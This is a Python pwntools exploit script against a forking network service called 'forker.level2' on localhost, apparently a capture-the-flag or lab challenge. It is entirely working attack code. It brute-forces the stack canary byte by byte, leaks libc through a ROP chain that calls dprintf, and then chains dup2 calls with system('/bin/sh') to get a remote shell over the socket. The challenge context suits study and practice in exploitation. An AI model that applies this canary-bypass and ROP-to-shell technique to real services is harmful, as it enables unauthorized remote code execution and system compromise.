from pwn import *

HOST,PORT = '127.0.0.1',31337

elf = ELF('./forker.level2')

libc = elf.libc

offset_to_canary = 72


pop_rdi_ret = 0x0000000000400bc3
ret = 0x0000000000400746
pop_rsi_r15_ret = 0x0000000000400bc1
SOCKFD = 4

def establish_connection():
    return remote(HOST,PORT)

def leak_canary():
    canary = b'\x00'
    for i in range(8):
        for j in range(0x0,0x100):
            if(j == 10):
                continue
            io = establish_connection()
            payload = b''
            payload += b'A'*72
            payload += canary
            payload += p8(j)
            io.sendlineafter(b'Password:',payload)
            try:
                    io.recvline()
                    io.close()
                    if len(canary)>8:
                        break
                    else:
                        canary += p8(j)
            except Exception:
                    io.close()
                    continue
            
    return canary[0:8]


def leak_libc():
    io = establish_connection()

    rop = b''
    rop += p64(pop_rdi_ret)
    rop += p64(SOCKFD)
    rop += p64(pop_rsi_r15_ret)
    rop += p64(elf.got.dprintf)
    rop += p64(0x0) # padding to compensate for pop r15
    rop += p64(ret)
    rop += p64(elf.sym.dprintf)
    rop += p64(ret)
    rop += p64(elf.sym.exit)
    
    payload = b'A'*offset_to_canary
    payload += p64(canary)
    payload += b'B'*40
    payload += rop
    
    io.recvuntil(b'Password:') 
    io.sendline(payload)

    leak = io.recvn(6).ljust(8,b"\x00")
    io.close()
    return leak

def exploit():
    io = establish_connection()

    rop = b''
    rop += p64(pop_rdi_ret)
    rop += p64(SOCKFD)
    rop += p64(pop_rsi_r15_ret)
    rop += p64(0x0)
    rop += p64(0x0)
    rop += p64(ret)
    rop += p64(libc.sym.dup2)
    
    rop += p64(ret)             # i put this gadget because it does not work without it
    rop += p64(pop_rdi_ret)
    rop += p64(SOCKFD)
    rop += p64(pop_rsi_r15_ret)
    rop += p64(0x1)
    rop += p64(0x0)
    rop += p64(ret)
    rop += p64(libc.sym.dup2)
    
    rop += p64(ret)
    rop += p64(pop_rdi_ret)
    rop += p64(SOCKFD)
    rop += p64(pop_rsi_r15_ret)
    rop += p64(0x2)
    rop += p64(0x0)
    rop += p64(ret)
    rop += p64(libc.sym.dup2)
    
    rop += p64(ret)
    rop += p64(pop_rdi_ret)
    rop += p64(sh)
    rop += p64(ret)
    rop += p64(libc.sym.system)

    payload = b''
    payload += b'A'*offset_to_canary
    payload += p64(canary)
    payload += b'B'*40
    payload += rop

    io.recvuntil(b'Password:')
    io.sendline(payload)
    io.interactive()


canary = u64(leak_canary())
log.success(f'canary @ 0x{canary:02x}')
libc.address = u64(leak_libc()) - libc.sym.dprintf
log.success(f'libc base @ 0x{libc.address:02x}')
sh = next(libc.search(b'/bin/sh\x00'))
log.success(f'/bin/sh @ 0x{sh:02x}')
exploit()
